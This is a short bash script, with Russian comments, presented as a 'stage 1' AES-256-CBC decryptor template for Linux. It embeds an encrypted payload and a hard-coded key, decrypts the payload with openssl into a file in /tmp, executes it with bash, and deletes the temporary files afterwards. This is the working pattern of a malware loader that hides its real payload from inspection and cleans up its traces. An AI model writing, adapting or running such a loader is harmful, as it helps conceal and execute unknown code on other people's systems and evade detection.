#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="5e40fab9230eabb8176bd6d2bff38b9e:5jidyeC8KCTZwQ1EgXEADn6pEMaHnREfL2cnl6sCEFG7q1xIBnY90kYRsJ1x27bVpOHQJp/aY6Boh+/nNRQ9UXSSoGyF+URQXck2iB0lBPIMPtACfphhLjlIVj6RFeA48GSFxCfdzuKNBp29pMAN/s6G/WLpqMlaAdt7Rd9BAwh01mB6OGvZr8KoDACYdAhyiFGkb+acjiObrjj53f3XPmhGP7JO2IDgL1/kxa9Q6Rac+siGEZ1qL59t7KlEOVE1auyfP+K69R2ASpAfeGUlyiM3A9IjzEvMF9gQM/4rMDFDNHJi1oClInG4NHvyuotMEfqt6DLHo7yk63SeyjhQVJO67gE0ENubb75NRFF2zTqLxQlKC/8K+E/FcDv2QfcVtxdGR66W9PF28hTi/YyXQxDJJ7ahOGSqV9iDI2Ei3aYvacSjTIVZBrBccdQlAEG6697gWYnZBsjFT2RSO0ZQYPdmyUOxp8VGS+Eb+HjKMiA="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
